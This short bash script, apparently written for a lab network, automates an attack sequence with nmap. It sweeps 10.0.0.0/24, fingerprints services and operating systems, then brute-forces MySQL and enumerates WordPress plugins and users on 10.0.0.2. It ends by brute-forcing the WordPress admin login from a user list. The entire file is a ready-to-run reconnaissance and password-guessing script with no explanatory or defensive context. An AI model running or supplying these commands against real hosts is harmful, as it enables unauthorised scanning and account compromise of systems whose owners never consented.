echo -e "\e[5mTest start!!!\e[0m\n"
echo -e "\e[91mPing host lookup, find all hosts and IPs!!!\e[0m" 
xterm -T "Ping host lookup, find all hosts and IPs!!!" -hold -e nmap -sn 10.0.0.0/24 &
echo -e "\e[93mFind all ports and versions in each host!!!\e[0m" 
xterm -T "Find all ports and versions in each host!!!" -hold -e nmap -sV 10.0.0.0/24 &
echo -e "\e[92mFind all OSs in each host!!!\e[0m"
xterm -T "Find all OSs in each host!!!" -hold -e nmap -O 10.0.0.0/24 &
echo -e "\e[94mPerform a brute force MySQL attack against 10.0.0.2!!!\e[0m"
xterm -T "Perform a brute force MySQL attack against 10.0.0.2!!!" -hold -e nmap -p3306 --script mysql-brute 10.0.0.2 &
echo -e "\e[95mScan MySQL at 10.0.0.2!!!\e[0m"
xterm -T "Scan MySQL at 10.0.0.2!!!" -hold -e nmap -p 3306 10.0.0.2 -sV -sC &
echo -e "\e[91mList all wordpress plugins at 10.0.0.2!!!\e[0m"
xterm -T "List all wordpress plugins at 10.0.0.2!!!" -hold -e nmap -p 80 10.0.0.2 --script http-wordpress-enum --script-args type="plugins",search-limit=all &
echo -e "\e[93mList all wordpress users at 10.0.0.2!!!\e[0m"
xterm -T "List all wordpress users at 10.0.0.2!!!" -hold -e nmap -p80 10.0.0.2 --script http-wordpress-users &
echo -e "\e[92mBrute force the wordpress admin user at 10.0.0.2!!!\e[0m"
xterm -T "Brute force the wordpress admin user at 10.0.0.2!!!" -hold -e nmap -p80 10.0.0.2 --script http-wordpress-brute --script-args userdb=user.txt &
echo -e "\e[5mDone!!!\e[0m"
